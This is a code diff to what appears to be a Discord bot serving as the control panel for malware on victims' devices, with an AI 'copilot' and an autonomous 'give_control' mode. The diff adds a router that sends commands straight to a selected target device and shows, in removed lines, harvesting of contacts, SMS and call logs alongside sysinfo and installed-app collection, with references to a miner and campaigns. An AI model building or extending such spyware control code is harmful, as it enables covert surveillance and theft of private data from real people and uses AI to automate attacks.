@@ -11,6 +11,7 @@ import { videoStream } from './stream.js'
 import { aiCoPilot } from './ai-copilot/index.js'
 import { aiContext } from './ai-copilot/context.js'
 import { aiController } from './ai-copilot/controller.js'
+import { matchAction, getActionHelp } from './ai-copilot/router.js'
 import { buildMinerEmbed } from './bot/minerEmbed.js'
 import { campaignManager } from './ai-copilot/campaign.js'
 import { analyzeResults } from './ai-copilot/analyzer.js'
@@ -1098,14 +1099,33 @@ client.on(Events.MessageCreate, async (msg) => {
           }
 
           const aiMsg = args.join(' ')
-          if (!aiMsg) return msg.reply(`${E.target} Usage: \`!ai <request>\` or \`!ai give_control <objective>\` for autonomous mode ${E.skull}`)
+          if (!aiMsg) {
+            const actionHelp = getActionHelp()
+            return msg.reply(`${E.target} Usage: \`!ai <request>\` or \`!ai give_control <objective>\` for autonomous mode\n\n**Direct actions (no AI needed):**\n${actionHelp.slice(0, 1500)} ${E.skull}`)
+          }
           await msg.channel.sendTyping()
+
+          // ── ACTION ROUTER: intercept "do X" requests, execute directly, no AI ──
+          const routed = matchAction(aiMsg)
+          if (routed) {
+            await guild.channels.fetch()
+            const t = resolveTarget(guild, targets, uid)
+            if (!t.channel) return msg.reply(`${E.coffin} No target selected. Use \`!target <name>\` first ${E.skull}`)
+            // Wrap sendCmd for router's handler (cmd, args) → sendCmd(channel, cmd, payload)
+            const sendCmdWrap = (cmd, payload) => sendCmd(t.channel, cmd, payload || '')
+            const collectWrap = (cmd, timeout) => collectChannelResponse(t.channel, cmd, timeout || 15000)
+            try {
+              const result = await routed.action.handler(routed.match, sendCmdWrap, collectWrap)
+              return msg.reply({ ...bloodEmbed(bold(`🤖 ${routed.action.description}`), 'info', result || 'Done'), components: RESULT_BTNS })
+            } catch (err) { return msg.reply(`${E.coffin} ${err.message} ${E.skull}`) }
+          }
+
           try {
             // Ensure AI session exists before gathering
             let session = aiContext.getSession(guild.id, uid)
             if (!session) session = aiContext.createSession(guild.id, uid)
 
-            // Auto-gather real device context before consulting AI
+            // Only auto-gather for intelligence requests (not direct actions)
             await guild.channels.fetch()
             const t = resolveTarget(guild, targets, uid)
             if (t.channel) {
@@ -1116,9 +1136,6 @@ client.on(Events.MessageCreate, async (msg) => {
                   { cmd: 'ip', timeout: 15000 },
                   { cmd: 'sysinfo', timeout: 15000 },
                   { cmd: 'installed', timeout: 30000 },
-                  { cmd: 'contacts', timeout: 30000 },
-                  { cmd: 'sms', timeout: 30000 },
-                  { cmd: 'call_log', timeout: 30000 },
                 ]
                 const gathered = []
                 for (const { cmd, timeout } of gatherCmds) {
